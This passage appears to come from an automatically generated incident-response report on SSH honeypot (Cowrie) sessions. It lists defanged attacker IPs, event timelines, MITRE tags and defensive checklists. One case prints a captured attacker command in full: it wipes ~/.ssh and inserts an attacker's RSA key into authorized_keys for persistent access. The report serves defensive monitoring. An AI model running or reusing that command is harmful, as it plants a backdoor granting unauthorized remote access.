- [ ] Block `207.175.170[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4eb9d8dd7f25

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-10-03 02:50 |
| **Last Seen** | 2026-10-03 02:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 02:50:22` | `cowrie.session.connect` |
| `2026-10-03 02:50:22` | `cowrie.client.version` |
| `2026-10-03 02:50:22` | `cowrie.client.kex` |
| `2026-10-03 02:50:23` | `cowrie.login.success` |
| `2026-10-03 02:50:26` | `cowrie.direct-tcpip.request` |
| `2026-10-03 02:50:26` | `cowrie.direct-tcpip.ja4` |
| `2026-10-03 02:50:26` | `cowrie.direct-tcpip.data` |
| `2026-10-03 02:50:29` | `cowrie.direct-tcpip.request` |
| `2026-10-03 02:50:29` | `cowrie.direct-tcpip.ja4` |
| `2026-10-03 02:50:29` | `cowrie.direct-tcpip.data` |
| `2026-10-03 02:50:29` | `cowrie.direct-tcpip.request` |
| `2026-10-03 02:50:29` | `cowrie.direct-tcpip.ja4` |
| `2026-10-03 02:50:29` | `cowrie.direct-tcpip.data` |
| `2026-10-03 02:50:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99426a274105

| Field | Detail |
|---|---|
| **Source IP** | `34.78.189[.]3` |
| **First Seen** | 2026-10-03 02:54 |
| **Last Seen** | 2026-10-03 02:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 02:54:32` | `cowrie.session.connect` |
| `2026-10-03 02:54:32` | `cowrie.login.success` |
| `2026-10-03 02:54:33` | `cowrie.session.params` |
| `2026-10-03 02:54:33` | `cowrie.command.input` |
| `2026-10-03 02:54:33` | `cowrie.command.input` |
| `2026-10-03 02:54:33` | `cowrie.command.failed` |
| `2026-10-03 02:54:33` | `cowrie.command.input` |
| `2026-10-03 02:54:33` | `cowrie.log.closed` |
| `2026-10-03 02:54:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.189[.]3` to AbuseIPDB if not already reported
- [ ] Block `34.78.189[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de33ef34d7ad

| Field | Detail |
|---|---|
| **Source IP** | `34.78.189[.]3` |
| **First Seen** | 2026-10-03 02:54 |
| **Last Seen** | 2026-10-03 02:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 02:54:46` | `cowrie.session.connect` |
| `2026-10-03 02:54:46` | `cowrie.login.success` |
| `2026-10-03 02:54:47` | `cowrie.session.params` |
| `2026-10-03 02:54:47` | `cowrie.command.input` |
| `2026-10-03 02:54:47` | `cowrie.command.failed` |
| `2026-10-03 02:54:54` | `cowrie.log.closed` |
| `2026-10-03 02:54:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.189[.]3` to AbuseIPDB if not already reported
- [ ] Block `34.78.189[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37644c708fb8

| Field | Detail |
|---|---|
| **Source IP** | `34.78.189[.]3` |
| **First Seen** | 2026-10-03 02:54 |
| **Last Seen** | 2026-10-03 02:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 02:54:48` | `cowrie.session.connect` |
| `2026-10-03 02:54:48` | `cowrie.login.success` |
| `2026-10-03 02:54:48` | `cowrie.session.params` |
| `2026-10-03 02:54:48` | `cowrie.command.input` |
| `2026-10-03 02:54:54` | `cowrie.log.closed` |
| `2026-10-03 02:54:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.189[.]3` to AbuseIPDB if not already reported
- [ ] Block `34.78.189[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6bdd9ce1295

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-10-03 03:05 |
| **Last Seen** | 2026-10-03 03:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 03:05:25` | `cowrie.session.connect` |
| `2026-10-03 03:05:25` | `cowrie.client.version` |
| `2026-10-03 03:05:25` | `cowrie.client.kex` |
| `2026-10-03 03:05:26` | `cowrie.login.success` |
| `2026-10-03 03:05:27` | `cowrie.session.params` |
| `2026-10-03 03:05:27` | `cowrie.command.input` |
| `2026-10-03 03:05:27` | `cowrie.command.failed` |
| `2026-10-03 03:05:27` | `cowrie.log.closed` |
| `2026-10-03 03:05:28` | `cowrie.session.params` |
| `2026-10-03 03:05:28` | `cowrie.command.input` |
| `2026-10-03 03:05:28` | `cowrie.session.file_download` |
| `2026-10-03 03:05:28` | `cowrie.log.closed` |
| `2026-10-03 03:05:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1757b31a588f

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-10-03 03:05 |
| **Last Seen** | 2026-10-03 03:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 03:05:28` | `cowrie.session.connect` |
| `2026-10-03 03:05:28` | `cowrie.client.version` |
| `2026-10-03 03:05:28` | `cowrie.client.kex` |
| `2026-10-03 03:05:29` | `cowrie.login.success` |
| `2026-10-03 03:05:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26b6bdb48869

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-10-03 03:13 |
| **Last Seen** | 2026-10-03 03:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 03:13:03` | `cowrie.session.connect` |
| `2026-10-03 03:13:03` | `cowrie.client.version` |
| `2026-10-03 03:13:03` | `cowrie.client.kex` |
| `2026-10-03 03:13:04` | `cowrie.login.success` |
| `2026-10-03 03:13:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2d04b2384ba

| Field | Detail |
|---|---|
| **Source IP** | `180.184.160[.]211` |
| **First Seen** | 2026-10-03 03:21 |
| **Last Seen** | 2026-10-03 03:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 03:21:57` | `cowrie.session.connect` |
| `2026-10-03 03:21:57` | `cowrie.client.version` |
| `2026-10-03 03:21:57` | `cowrie.client.kex` |
| `2026-10-03 03:22:00` | `cowrie.login.success` |
| `2026-10-03 03:22:02` | `cowrie.session.params` |
| `2026-10-03 03:22:02` | `cowrie.command.input` |
| `2026-10-03 03:22:02` | `cowrie.log.closed` |
| `2026-10-03 03:22:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.160[.]211` to AbuseIPDB if not already reported
- [ ] Block `180.184.160[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73915e004346

| Field | Detail |
|---|---|
| **Source IP** | `35.240.2[.]89` |
| **First Seen** | 2026-10-03 03:25 |
| **Last Seen** | 2026-10-03 03:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 03:25:54` | `cowrie.session.connect` |
| `2026-10-03 03:25:54` | `cowrie.client.version` |
| `2026-10-03 03:25:54` | `cowrie.client.kex` |
| `2026-10-03 03:25:56` | `cowrie.login.success` |
| `2026-10-03 03:25:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.240.2[.]89` to AbuseIPDB if not already reported
- [ ] Block `35.240.2[.]89` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (182) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-37420a69cb96 | HIGH | `94.154.43[.]69` | 2026-10-03 03:37 | Y | 2 | 6 | `T1059.004 · T1078 · T1105` |
| IR-b5f2dc4449d7 | HIGH | `94.154.43[.]69` | 2026-10-03 03:45 | Y | 2 | 6 | `T1059.004 · T1078 · T1105` |
| IR-54622518eaac | HIGH | `195.178.110[.]218` | 2026-10-03 04:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-45eff0731e08 | HIGH | `94.154.43[.]69` | 2026-10-03 04:01 | Y | 2 | 6 | `T1059.004 · T1078 · T1105` |
| IR-5ee7908713d0 | HIGH | `129.121.140[.]118` | 2026-10-03 04:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7eb00515ada5 | HIGH | `129.121.140[.]118` | 2026-10-03 04:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8b12751ac001 | HIGH | `73.147.19[.]171` | 2026-10-03 04:09 | Y | 9 | 0 | `T1057 · T1078 · T1083` |
| IR-df715897443a | HIGH | `94.154.43[.]69` | 2026-10-03 04:10 | Y | 2 | 6 | `T1059.004 · T1078 · T1105` |
| IR-63fe344f1679 | HIGH | `94.154.43[.]69` | 2026-10-03 04:12 | Y | 1 | 6 | `T1059.004 · T1078 · T1105` |
| IR-f7a688ad7cde | HIGH | `176.53.159[.]196` | 2026-10-03 04:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9474fece5d95 | HIGH | `45.33.109[.]8` | 2026-10-03 04:43 | Y | 3 | 0 | `T1078` |
| IR-55319028c762 | HIGH | `165.1.75[.]106` | 2026-10-03 05:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-58f4db3d3fb3 | HIGH | `172.235.41[.]110` | 2026-10-03 05:03 | Y | 3 | 0 | `T1078` |
| IR-d4f540859b1e | HIGH | `103.143.72[.]165` | 2026-10-03 05:05 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-40d620651e3f | HIGH | `103.143.72[.]165` | 2026-10-03 05:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0f419dcfa302 | HIGH | `138.226.239[.]233` | 2026-10-03 05:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b2ca187cd019 | HIGH | `222.119.198[.]34` | 2026-10-03 05:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e6b18c59b57b | HIGH | `195.178.110[.]26` | 2026-10-03 05:27 | Y | 1 | 0 | `T1078 · T1592` |
| IR-f4a6a9059df1 | HIGH | `77.90.185[.]17` | 2026-10-03 05:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-be17cc9b7b35 | HIGH | `118.36.136[.]12` | 2026-10-03 05:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d6ea7ec7e464 | HIGH | `118.36.136[.]12` | 2026-10-03 05:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d6fdad029afb | HIGH | `170.106.67[.]167` | 2026-10-03 05:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9f774e3bf716 | HIGH | `170.106.67[.]167` | 2026-10-03 05:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-97bf6bf8b0b3 | HIGH | `58.222.244[.]226` | 2026-10-03 05:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-20935d335189 | HIGH | `103.216.170[.]141` | 2026-10-03 05:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a22f43b10dc9 | HIGH | `103.216.170[.]141` | 2026-10-03 05:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-50bb678a3dad | HIGH | `58.222.244[.]226` | 2026-10-03 05:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-65dd6f422270 | HIGH | `14.103.118[.]106` | 2026-10-03 05:46 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-13ea73c49a07 | HIGH | `14.103.118[.]106` | 2026-10-03 05:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-696b4e141dc1 | HIGH | `170.64.137[.]28` | 2026-10-03 05:52 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bf98b4704d75 | HIGH | `103.200.25[.]198` | 2026-10-03 05:57 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bee8ef9e10b6 | HIGH | `103.200.25[.]198` | 2026-10-03 05:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3897dfac6826 | HIGH | `186.96.158[.]180` | 2026-10-03 05:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bee460b5cbc9 | HIGH | `186.96.158[.]180` | 2026-10-03 05:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d707500228af | HIGH | `195.178.110[.]218` | 2026-10-03 06:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-be0aa2782186 | HIGH | `195.178.110[.]26` | 2026-10-03 06:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-2cd27d07b64a | HIGH | `213.215.209[.]101` | 2026-10-03 06:05 | Y | 0 | 0 | `T1078 · T1105 · T1592` |
| IR-f7ed3a32c452 | HIGH | `172.252.13[.]101` | 2026-10-03 06:09 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a4023d960500 | HIGH | `172.252.13[.]101` | 2026-10-03 06:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-316b1e76db04 | HIGH | `77.90.185[.]17` | 2026-10-03 06:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-165b229b2c1f | HIGH | `138.226.239[.]233` | 2026-10-03 06:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-171130536c72 | HIGH | `129.226.153[.]214` | 2026-10-03 06:15 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e4872962e849 | HIGH | `129.226.153[.]214` | 2026-10-03 06:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-19bc9f0d97c6 | HIGH | `109.160.32[.]114` | 2026-10-03 06:25 | Y | 1 | 0 | `T1078 · T1592` |
| IR-83b7aacaa574 | HIGH | `66.228.53[.]157` | 2026-10-03 06:29 | Y | 3 | 0 | `T1078` |
| IR-3e68f5092210 | HIGH | `176.53.159[.]196` | 2026-10-03 06:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c218fb75b862 | HIGH | `45.79.8[.]221` | 2026-10-03 06:39 | Y | 0 | 0 | `T1078` |
| IR-867eb8b0d4a9 | HIGH | `185.143.197[.]45` | 2026-10-03 07:56 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6d61994cd00d | HIGH | `185.143.197[.]45` | 2026-10-03 07:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8d8eaa9f8ff2 | HIGH | `45.78.235[.]121` | 2026-10-03 07:57 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b7d5e462374a | HIGH | `45.78.235[.]121` | 2026-10-03 07:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fecbd54599e3 | HIGH | `117.39.44[.]227` | 2026-10-03 07:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b2e1f2252946 | HIGH | `117.39.44[.]227` | 2026-10-03 07:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f6cba3784a74 | HIGH | `195.178.110[.]26` | 2026-10-03 08:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-9bf8ceaa8678 | HIGH | `114.80.39[.]74` | 2026-10-03 08:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-687a93a862f4 | HIGH | `114.80.39[.]74` | 2026-10-03 08:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8b8c0db4777d | HIGH | `43.156.33[.]17` | 2026-10-03 08:19 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c62aa68c909c | HIGH | `43.156.33[.]17` | 2026-10-03 08:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b06a7e9c2d35 | HIGH | `103.183.75[.]14` | 2026-10-03 08:19 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-0896cd003783 | HIGH | `103.183.75[.]14` | 2026-10-03 08:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-96e9da543f80 | HIGH | `115.178.75[.]242` | 2026-10-03 08:23 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1ac1c4e69ca4 | HIGH | `115.178.75[.]242` | 2026-10-03 08:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4de89e723240 | HIGH | `166.62.41[.]190` | 2026-10-03 08:24 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e1fe0e97d8b4 | HIGH | `166.62.41[.]190` | 2026-10-03 08:24 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ceda777666e3 | HIGH | `103.86.180[.]10` | 2026-10-03 08:25 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7c576b5b460b | HIGH | `103.86.180[.]10` | 2026-10-03 08:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bec9be18972a | HIGH | `179.27.97[.]205` | 2026-10-03 08:27 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9652aa9ab554 | HIGH | `179.27.97[.]205` | 2026-10-03 08:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-464ab1ed7481 | HIGH | `188.253.7[.]4` | 2026-10-03 08:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-03c9558c00fc | HIGH | `188.253.7[.]4` | 2026-10-03 08:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d8cfceb798c8 | HIGH | `163.7.3[.]26` | 2026-10-03 08:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-04400b33d714 | HIGH | `163.7.3[.]26` | 2026-10-03 08:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-800b4ebb6085 | HIGH | `34.58.124[.]191` | 2026-10-03 08:31 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2d8171f27853 | HIGH | `34.58.124[.]191` | 2026-10-03 08:31 | Y | 0 | 0 | `T1078 · T1592` |
| IR-62c1302a818e | HIGH | `45.78.224[.]198` | 2026-10-03 08:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ca54b7e4cd06 | HIGH | `138.226.239[.]234` | 2026-10-03 08:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e3213de1df3f | HIGH | `176.53.159[.]196` | 2026-10-03 08:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e424debf1c8a | HIGH | `77.90.185[.]17` | 2026-10-03 08:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a5ad0788d48e | HIGH | `196.189.236[.]67` | 2026-10-03 08:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a1c9f8e049f8 | HIGH | `130.12.180[.]51` | 2026-10-03 08:59 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-d470fa7acae9 | HIGH | `103.112.54[.]86` | 2026-10-03 09:21 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f01de363be2d | HIGH | `103.112.54[.]86` | 2026-10-03 09:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-240ab3be69a9 | HIGH | `187.52.212[.]235` | 2026-10-03 09:21 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-37197abb9b7a | HIGH | `187.52.212[.]235` | 2026-10-03 09:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-89a4c97a66d1 | HIGH | `124.174.32[.]95` | 2026-10-03 09:22 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-1ccdf53090f9 | HIGH | `209.38.120[.]71` | 2026-10-03 09:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3adcbf63884f | HIGH | `209.38.120[.]71` | 2026-10-03 09:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a21bfcfe47fe | HIGH | `47.79.225[.]13` | 2026-10-03 09:35 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2d1861b20127 | HIGH | `47.79.225[.]13` | 2026-10-03 09:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3cbf766dd0b3 | HIGH | `138.226.239[.]233` | 2026-10-03 09:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0e2781d6c4c2 | HIGH | `52.176.211[.]73` | 2026-10-03 09:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-252feb3a7066 | HIGH | `52.176.211[.]73` | 2026-10-03 09:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5a829731128e | HIGH | `186.13.24[.]118` | 2026-10-03 09:41 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-101cc4a57172 | HIGH | `186.13.24[.]118` | 2026-10-03 09:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-60c6aad2d844 | HIGH | `36.231.108[.]41` | 2026-10-03 09:48 | Y | 1 | 0 | `T1078 · T1592` |
| IR-b054a41268e6 | HIGH | `193.112.192[.]91` | 2026-10-03 10:22 | Y | 1 | 0 | `T1078 · T1592` |
| IR-e5dcafc5039d | HIGH | `193.112.192[.]91` | 2026-10-03 10:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b8c9307b7fcf | HIGH | `102.88.137[.]80` | 2026-10-03 10:32 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-188c8f87242d | HIGH | `102.88.137[.]80` | 2026-10-03 10:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b1bc8ceac153 | HIGH | `206.72.195[.]47` | 2026-10-03 10:33 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
_… 82 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `112.164.146[.]173` | **4** | 2026-10-03 09:31 | 2026-10-03 14:02 | 1m | 0 | `T1592` | 🟢 LOW |
| `46.100.134[.]114` | **4** | 2026-10-03 04:44 | 2026-10-03 10:01 | 1m | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | **2** | 2026-10-03 01:06 | 2026-10-03 02:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]218` | **2** | 2026-10-03 03:12 | 2026-10-03 04:20 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.195[.]65` | **2** | 2026-10-03 09:58 | 2026-10-03 10:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.89.76[.]249` | 1 | 2026-10-03 07:56 | 2026-10-03 07:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.203.59[.]9` | 1 | 2026-10-03 08:46 | 2026-10-03 08:47 | 10s | 0 | `T1592` | 🟢 LOW |
| `103.26.76[.]159` | 1 | 2026-10-03 06:13 | 2026-10-03 06:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]114` | 1 | 2026-10-03 06:25 | 2026-10-03 06:25 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]41` | 1 | 2026-10-03 00:55 | 2026-10-03 00:55 | 7s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]44` | 1 | 2026-10-03 13:53 | 2026-10-03 13:53 | 7s | 0 | `T1592` | 🟢 LOW |
| `111.47.82[.]101` | 1 | 2026-10-03 09:52 | 2026-10-03 09:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.219.157[.]97` | 1 | 2026-10-03 04:02 | 2026-10-03 04:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.229[.]117` | 1 | 2026-10-03 08:23 | 2026-10-03 08:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.78.236[.]124` | 1 | 2026-10-03 09:30 | 2026-10-03 09:30 | 12s | 0 | `T1592` | 🟢 LOW |
| `116.153.81[.]58` | 1 | 2026-10-03 10:28 | 2026-10-03 10:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.50.70[.]169` | 1 | 2026-10-03 04:06 | 2026-10-03 04:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.86[.]5` | 1 | 2026-10-03 11:52 | 2026-10-03 11:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.169.106[.]30` | 1 | 2026-10-03 07:47 | 2026-10-03 07:47 | 18s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-03 07:06 | 2026-10-03 07:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-03 09:55 | 2026-10-03 09:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-03 12:34 | 2026-10-03 12:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]51` | 1 | 2026-10-03 08:36 | 2026-10-03 08:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-03 09:10 | 2026-10-03 09:11 | 10s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-03 02:25 | 2026-10-03 02:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-03 08:29 | 2026-10-03 08:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-03 10:34 | 2026-10-03 10:35 | 62s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]107` | 1 | 2026-10-03 09:38 | 2026-10-03 09:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]25` | 1 | 2026-10-03 10:31 | 2026-10-03 10:33 | 120s | 0 | `T1592` | 🟢 LOW |
